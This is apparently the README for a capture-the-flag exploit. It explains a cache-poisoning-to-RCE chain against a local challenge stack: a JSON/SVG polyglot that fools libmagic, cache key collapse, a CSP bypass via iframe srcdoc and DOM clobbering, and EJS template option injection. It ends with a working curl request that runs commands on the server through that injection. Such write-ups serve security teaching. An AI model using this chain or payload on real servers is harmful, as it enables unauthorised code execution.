# Chromatic PoC

`exploit.py` runs the full cache-to-RCE chain against an unmodified stack and
prints the flag on stdout. Python 3.11+, `requests` only.

```bash
python3 exploit.py --host 127.0.0.1 --port 8080
python3 exploit.py --base-url http://chromatic.ctf:8080
```

Progress to stderr, flag alone to stdout, exit 1 on failure. Verified twice
against the shipped `docker-compose.yml` with no source changes.

## The chain

| Stage | Where | What |
|---|---|---|
| 1 | `/api/media` | store a JSON manifest that libmagic reads as an SVG |
| 2 | edge | confirm the cache key ignores the path |
| 3 | `/api/media/raw` | land the asset in the manifest's cache entry |
| 4 | `/api/report` | make the admin bot render it |
| 5 | `/api/admin/export-preview` | EJS option injection in the renderer |
| 6 | `/api/telemetry` | read the command output back |

## Stage 1: one prefix, three bypasses

The asset has to be an allowed image type for `/api/media`, and valid JSON for
the workspace page's `JSON.parse`. The body that satisfies both is:

```
)]}',\n{"_":"<!doctype svg","name":"…","blocks":[{"kind":"archive","packet":"…"}]}
```

`)]}',\n` is doing three separate jobs:

- **Angular** strips it. `XSSI_PREFIX = /^\)\]\}',?\n/` in the HTTP client, so
  `JSON.parse` sees a clean object.
- **`hasDocumentPreamble`** reads the first non-whitespace byte and blocks `{`
  and `[`. It sees `)` and returns false.
- **libmagic** no longer sees valid JSON at offset 0, so its `application/json`
  detector loses. That matters because of the next part.

With the JSON detector out of the way, this rule in libmagic's `Magdir/sgml`
takes over:

```
0	search/4096/cWbt	\<!doctype\ svg	SVG XML document
!:mime  image/svg+xml
!:strength + 30
```

`search/4096`, not `string`. The marker can sit **anywhere in the first 4096
bytes** and it is case-insensitive, so `"<!doctype svg"` as an ordinary JSON
string value is enough to have the document typed `image/svg+xml`. It goes in
the first member so it stays inside the window however large the packet grows.

The other five allowed types are offset-0 `string` rules, and so is `<svg`
itself. Only the doctype rule searches. Measured:

| body | libmagic |
|---|---|
| `{…"<!doctype svg"…}` | `application/json` (JSON detector wins) |
| 65 spaces + `{…"<!doctype svg"…}` | `application/json` (still JSON at offset 0) |
| `)]}',\n{…"<!doctype svg"…}` | **`image/svg+xml`** |
| `)]}',\n{…"<!DOCTYPE SVG"…}` | **`image/svg+xml`** (flag `c`) |
| one space + `<svg …/>` | `text/plain` |
| `{` + any binary magic | `application/octet-stream` |

## Stages 2 and 3: cache key collapse

`$representation_id` rewrites the key for any `/api/*` URL carrying
`workspace=<24 hex>` down to that id alone, so
`/api/media/raw?id=…&workspace=W` and `/api/workspaces/manifest?workspace=W`
share one entry. `/api/media/raw` sets `max-age=600` against the manifest's
`max-age=60`, so the poisoned entry outlives the real one. `X-Asset-Id` replays
on the manifest URL, which is the oracle stage 2 uses before touching a key the
bot will read.

## Stage 4 and 5: XSS to RCE

The archive block's integrity field is plain FNV-1a-32 with no secret. Scripts
inserted through `innerHTML` never execute and the CSP has no `'unsafe-inline'`,
so the markup is an `<iframe srcdoc>`: the srcdoc document inherits the page CSP,
which makes `/static/board-compat.js` a permitted `'self'` script inside a
document we author. A `<form id="__chromaticBridge">` with named inputs clobbers
the global that gadget reads, and it replays the bot's admin cookie at the
renderer proxy. There `theme` merges into the EJS options object and
`outputFunctionName` is concatenated into compiled template source
(CVE-2022-29078). `/readflag` is SUID root, so uid 10001 reads the 0400 flag.

## Note on the shipped admin token

`docker-compose.yml` ships `ADMIN_TOKEN: local-admin-cookie-8fe136ca98`, and
`isAdmin()` compares the cookie against it. Against a local stack that single
request reaches stage 5 directly and is a useful smoke test for the renderer:

```bash
curl -s -X POST http://localhost:8080/api/admin/export-preview \
  -H 'content-type: application/json' \
  -b 'chromatic_admin=local-admin-cookie-8fe136ca98' \
  -d '{"theme":{"outputFunctionName":"__p=1; return process.mainModule.require(\"child_process\").execSync(\"/readflag /flag\").toString(); var __q"},"title":"x"}'
```

It is not part of the exploit. A real deployment sets a random token, so
`exploit.py` never uses it.
